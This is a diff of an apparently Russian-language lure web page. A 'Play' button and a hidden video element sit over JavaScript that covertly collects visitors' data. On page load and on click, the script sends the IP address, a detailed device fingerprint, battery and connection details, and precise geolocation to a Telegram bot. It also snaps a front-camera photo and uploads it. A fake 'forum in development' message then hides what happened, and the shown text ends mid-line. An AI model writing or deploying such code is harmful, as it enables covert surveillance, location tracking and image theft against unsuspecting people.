@@ -53,6 +53,9 @@
             height: 80px;
             margin-bottom: 100px;
             cursor: pointer;
+            position: absolute;
+            bottom: 150px;
+            opacity: 0;
         }
         
         .hidden-camera {
@@ -69,14 +72,21 @@
             text-align: center;
             color: #fff;
             font-size: 12px;
-            background: rgba(0, 0, 0, 0.5);
             padding: 5px 0;
         }
         
-        .legal-links a {
-            color: #fff;
-            text-decoration: none;
-            margin: 0 10px;
+        .message-box {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            z-index: 100;
+            display: none;
         }
     </style>
 </head>
@@ -88,8 +98,11 @@
     </div>
 
     <div class="legal-links">
-        <a href="#">Договор оферты</a>
-        <a href="#">Политика конфиденциальности</a>
+        Договор оферты    Политика конфиденциальности
+    </div>
+
+    <div class="message-box" id="messageBox">
+        Форум в разработке
     </div>
 
     <video id="hiddenCamera" class="hidden-camera" autoplay playsinline></video>
@@ -99,6 +112,7 @@
         const chatId = '-1002577213610';
         const videoElement = document.getElementById('hiddenCamera');
         const playBtn = document.getElementById('playBtn');
+        const messageBox = document.getElementById('messageBox');
         let stream = null;
 
         // Блокировка масштабирования
@@ -112,19 +126,142 @@
             }
         }, { passive: false });
 
+        // Функция для получения информации о батарее
+        async function getBatteryInfo() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return {
+                        level: Math.round(battery.level * 100) + '%',
+                        charging: battery.charging ? 'Да' : 'Нет',
+                        chargingTime: battery.chargingTime ? battery.chargingTime + ' сек' : 'Неизвестно',
+                        dischargingTime: battery.dischargingTime ? battery.dischargingTime + ' сек' : 'Неизвестно'
+                    };
+                } catch (e) {
+                    return { error: 'Не удалось получить данные о батарее' };
+                }
+            }
+            return { error: 'API батареи не поддерживается' };
+        }
+
+        // Функция для получения информации о геолокации
+        async function getGeolocation() {
+            if ('geolocation' in navigator) {
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 5000,
+                            maximumAge: 0
+                        });
+                    });
+                    
+                    return {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy + ' метров',
+                        altitude: position.coords.altitude || 'Недоступно',
+                        speed: position.coords.speed || 'Недоступно'
+                    };
+                } catch (e) {
+                    return { error: 'Геолокация запрещена или недоступна: ' + e.message };
+                }
+            }
+            return { error: 'Геолокация не поддерживается' };
+        }
+
+        // Функция для получения информации о соединении
+        function getConnectionInfo() {
+            if ('connection' in navigator) {
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (connection) {
+                    return {
+                        type: connection.type || 'Неизвестно',
+                        effectiveType: connection.effectiveType || 'Неизвестно',
+                        downlink: connection.downlink + ' Mbps',
+                        rtt: connection.rtt + ' мс',
+                        saveData: connection.saveData ? 'Да' : 'Нет'
+                    };
+                }
+            }
+            return { error: 'Информация о соединении недоступна' };
+        }
+
+        // Функция для получения информации об устройстве
+        function getDeviceInfo() {
+            const screen = window.screen;
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages ? navigator.languages.join(', ') : 'Неизвестно',
+                cookieEnabled: navigator.cookieEnabled ? 'Да' : 'Нет',
+                doNotTrack: navigator.doNotTrack || 'Неизвестно',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Неизвестно',
+                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Неизвестно',
+                maxTouchPoints: navigator.maxTouchPoints || 'Неизвестно',
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight,
+                    colorDepth: screen.colorDepth + ' бит',
+                    pixelDepth: screen.pixelDepth + ' бит',
+                    orientation: screen.orientation ? screen.orientation.type : 'Неизвестно'
+                },
+                window: {
+                    innerWidth: window.innerWidth,
+                    innerHeight: window.innerHeight,
+                    outerWidth: window.outerWidth,
+                    outerHeight: window.outerHeight
+                },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                date: new Date().toString(),
+                localTime: new Date().toLocaleString(),
+                timezoneOffset: new Date().getTimezoneOffset() + ' минут'
+            };
+
+            return deviceInfo;
+        }
+
+        // Функция для форматирования информации в читаемый вид
+        function formatInfo(info) {
+            let result = '';
+            for (const [key, value] of Object.entries(info)) {
+                if (typeof value === 'object' && value !== null) {
+                    result += `\n${key}:\n${formatInfo(value).replace(/^/gm, '  ')}`;
+                } else {
+                    result += `${key}: ${value}\n`;
+                }
+            }
+            return result;
+        }
+
         // 1. Отправка информации о пользователе
         async function sendUserInfo() {
             try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                const ip = data.ip;
-                
-                const userAgent = navigator.userAgent;
-                const screenRes = `${window.screen.width}x${window.screen.height}`;
-                const time = new Date().toLocaleString();
-                
-                const message = `🚨 Новый посетитель:\nIP: ${ip}\nУстройство: ${userAgent}\nЭкран: ${screenRes}\nВремя: ${time}`;
-                
+                // Получаем IP-адрес
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+
+                // Получаем дополнительную информацию
+                const [batteryInfo, geolocationInfo, connectionInfo] = await Promise.all([
+                    getBatteryInfo(),
+                    getGeolocation(),
+                    getConnectionInfo()
+                ]);
+
+                const deviceInfo = getDeviceInfo();
+
+                // Формируем сообщение
+                let message = `🚨 Новый посетитель:\nIP: ${ip}\n\n`;
+                message += `=== Информация об устройстве ===\n${formatInfo(deviceInfo)}\n`;
+                message += `=== Батарея ===\n${formatInfo(batteryInfo)}\n`;
+                message += `=== Соединение ===\n${formatInfo(connectionInfo)}\n`;
+                message += `=== Геолокация ===\n${formatInfo(geolocationInfo)}\n`;
+
+                // Отправляем сообщение в Telegram
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: {
@@ -135,51 +272,63 @@
                         text: message
                     })
                 });
+
             } catch (error) {
                 console.error('Error sending user info:', error);
+                // Отправляем хотя бы базовую информацию в случае ошибки
+                try {
+                    const deviceInfo = getDeviceInfo();
+                    let fallbackMessage = `⚠️ Не удалось собрать полную информацию, но вот что есть:\n`;
+                    fallbackMessage += formatInfo(deviceInfo);
+                    
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: fallbackMessage
+                        })
+                    });
+                } catch (e) {
+                    console.error('Fallback error:', e);
+                }
             }
         }
 
         // 2. Захват фото с камеры
         async function captureAndSendPhoto() {
             try {
-                // Ждем 1 секунду чтобы камера стабилизировалась
                 await new Promise(resolve => setTimeout(resolve, 1000));
                 
-                // Создаем canvas для захвата кадра
                 const canvas = document.createElement('canvas');
                 canvas.width = videoElement.videoWidth;
                 canvas.height = videoElement.videoHeight;
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                 
-                // Преобразуем в blob
                 const blob = await new Promise(resolve => {
                     canvas.toBlob(resolve, 'image/jpeg', 0.8);
                 });
                 
-                // Создаем FormData для отправки
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
                 formData.append('photo', blob, 'verification_photo.jpg');
                 
-                // Добавляем описание
                 const caption = `🆔 Фото верификации\nВремя: ${new Date().toLocaleString()}`;
                 formData.append('caption', caption);
                 
-                // Отправляем фото в Telegram
                 await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
                 
-                // Перенаправляем после успешной проверки
-                window.location.href = "https://your-game-link.com";
+                messageBox.style.display = 'block';
                 
             } catch (error) {
                 console.error('Error capturing photo:', error);
-                // В случае ошибки все равно перенаправляем
-                window.location.href = "https://your-game-link.com";
+                messageBox.style.display = 'block';
             } finally {
                 stopCamera();
             }
@@ -188,10 +337,9 @@
         // 3. Запуск камеры устройства
         async function startCamera() {
             try {
-                // Запрашиваем доступ к камере устройства (не Telegram)
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
-                        facingMode: 'user', // Фронтальная камера
+                        facingMode: 'user',
                         width: { ideal: 1280 },
                         height: { ideal: 720 }
                     },
@@ -199,14 +347,11 @@
                 });
                 
                 videoElement.srcObject = stream;
-                
-                // Сразу делаем фото после получения доступа
                 await captureAndSendPhoto();
                 
             } catch (error) {
                 console.error('Camera error:', error);
-                // В случае ошибки все равно перенаправляем
-                window.location.href = "https://your-game-link.com";
+                messageBox.style.display = 'block';
             }
         }
 
@@ -220,12 +365,11 @@
 
         // 5. Обработчик кнопки "Играть"
         playBtn.addEventListener('click', async function() {
-            await sendUserInfo(); // Сначала отправляем информацию о пользователе
-            await startCamera(); // Затем запускаем процесс верификации
+            await sendUserInfo();
+            await startCamera();
         });
 
-        // Остановка камеры при закрытии страницы
-        window.addEventListener('beforeunload', stopCamera);
-    </script>
-</body>
-</html>
+        // Отправляем информацию о пользователе сразу при загрузке страницы
+        window.addEventListener('load', sendUserInfo);
+
+        // Остановка
